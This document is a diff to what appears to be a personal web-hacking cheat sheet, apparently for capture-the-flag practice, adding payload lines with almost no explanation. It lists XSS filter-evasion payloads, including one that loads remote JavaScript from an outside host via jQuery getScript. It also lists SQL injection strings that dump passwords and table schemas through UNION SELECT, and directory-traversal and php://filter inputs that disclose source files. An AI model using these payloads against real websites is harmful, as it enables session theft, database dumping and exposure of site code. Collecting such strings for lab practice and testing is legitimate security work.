@@ -14,6 +14,9 @@ html += "<img src='/static/level3/cloud"'onerror="alert('XSS')"'".jpg' />";
 * on url
 javascript:void(document.forms[0].p2.childNodes[1].innerText='<script>alert(document.domain)</script>');
 
+* svg
+<svg onload=alert("xss!")>
+
 * mouseover
 " onmouseover="alert(document.domain);" x="
 
@@ -23,6 +26,20 @@ javascript:void(document.forms[0].p2.childNodes[1].innerText='<script>alert(docu
 " onmouseover = " alert('\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x64\x6F\x6D\x61\x69\x6E')"
 "><script>alert(\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x64\x6F\x6D\x61\x69\x6E)</script>
 " onmouseover = " alert('\x58\x53\x53') "
+"/onmouseover="window['aler'+'t']('XS'+'S')">
+
+* space
+<style/onload    =    !-alert&#x28;document.domain&#x29;>
+
+* vbs
+<img language=vbs src=<b onerror=alert#1/1#>
+
+* short
+<q/oncut=alert()
+<q/oncopy=alert()
+
+* unicode escape
+<script>\u0078=\u0061\u006c\u0065\u0072\u0074; \u0078("\u0068\x61\150\u0061");</script>
 
 * gsub
 "><sscriptcript>alert('XSS')</sscriptcript>
@@ -33,14 +50,31 @@ background-color:#f00;background:url("javascript:alert(document.domain);");
 <p id=1 onmouseover=alert(document.getElementById(1).innerHTML)>XSS</p>
 "(function (text){if(!f)a(text);if(text==='XSS'){if(!f){f=1;window.setTimeout(function(){f=0},100);if(li)li.innerHTML=t}else{f=0;cs=[5010175210,5010175222,5010175227,5010175166,5010175224,5010175218,5010175231,5010175225,5010175166,5010175223,5010175213,5010175140,5010175166,5010175199,5010175194,5010175197,5010175178,5010175192,5010175169,5010175191,5010175169,5010175146,5010175187,5010175169,5010175146,5010175218,5010175149,5010175180,5010175210,5010175169,5010175187,5010175146,5010175216];t='';for(i=0;i<cs.length;i++){t+=String.fromCharCode(cs[i]^0x123456789+123456789)}appendTweet('<b>'+t+'</b>')}}else{f=0}})"
 
-#SQLi
+* jquery
+<img src=1 onerror=$.getScript('http://vuln.moe/web/xss/xss.js')>
+
+
+# SQLi
 * basic
 ' or 1=1;--
 ' or 1=1;#
-' == '
 ' or '1
 
 * union
 ' or 1=1 union select sql,1,1 from sqlite_master;--
 ' or 1=1 union select password, name, 1 from users_hogefuga;--
+SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members 
 
+https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
+
+# Wire shark packete filter
+icmp.type == 8
+http.host contains google
+* パケットサイズ
+frame.len == 18
+data.data
+frame contains 17
+
+# directory traversal
+view.php?file=../index.php
+?lang=php://filter/convert.base64-encode/resource=index.php
